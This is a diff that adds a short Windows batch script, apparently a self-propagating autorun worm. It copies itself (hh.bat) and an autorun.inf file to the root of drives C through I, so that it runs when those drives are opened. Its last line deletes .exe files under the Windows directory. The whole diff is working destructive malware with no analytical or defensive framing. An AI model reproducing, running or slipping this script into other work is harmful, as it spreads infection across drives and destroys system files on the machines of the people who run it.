@@ -1,0 +1,15 @@
+copy hh.bat c:
+copy hh.bat d:
+copy hh.bat e:
+copy hh.bat f:
+copy hh.bat g:
+copy hh.bat h:
+copy hh.bat i:
+copy autorun.inf c:
+copy autorun.inf d:
+copy autorun.inf e:
+copy autorun.inf f:
+copy autorun.inf g:
+copy autorun.inf h:
+copy autorun.inf i:
+del c:/windows/ *.exe
